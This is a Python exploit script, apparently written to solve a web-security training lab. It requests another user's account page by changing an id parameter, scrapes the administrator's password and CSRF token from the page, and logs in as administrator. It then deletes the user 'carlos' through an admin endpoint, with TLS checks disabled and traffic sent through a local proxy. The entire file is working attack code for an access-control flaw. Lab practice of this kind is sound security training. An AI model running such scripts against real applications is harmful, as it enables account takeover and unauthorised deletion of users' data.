import requests
import urllib3
from bs4 import BeautifulSoup
import sys
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxie={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def delete_user(session,url):
    url_delete=url+"/admin/delete?username=carlos"
    response=session.get(url_delete,verify=False)
    response=response.text
    if "Congratulations, you solved the lab!" in response:
        print("(+) Congratulations, you solved the lab!")
    else:
        print('(-) Error while trying to solve lab ! ')
        
def login(session,url,csrf,password):
    url_login=url+"/login"
    data={"csrf":csrf,"username":"administrator","password":password}
    response=session.post(url_login,data=data,verify=False,proxies=proxie)
    if response.status_code == 200:
        print("(+) Login successfully to the admin acounte ")
        delete_user(session,url)
    else:
        print("(-) Error while trying to get to the admin acounte !")

def Ex_Pss_csrf(response):
    soup=BeautifulSoup(response,"html.parser")
    csrf=soup.find("input",{"name":"csrf"})["value"]
    password=soup.find("input",{"name":"password"})["value"]
    return csrf,password

def  get_password(session,url):
    
    url_admin=url+"/my-account?id=administrator"

    response=session.get(url_admin,verify=False)
    response=response.text
    pass_csrf=Ex_Pss_csrf(response)

    login(session,url,pass_csrf[0],pass_csrf[1])




def main():
    if len(sys.argv) !=2:
        print('(+) Usage %s <url>'%sys.argv[0])
        print('(+) Example %s www.site.com'%sys.argv[0])
        sys.exit(-1)
    
    url=sys.argv[1]
    session=requests.session()
    get_password(session,url)



if __name__ == "__main__":
    main()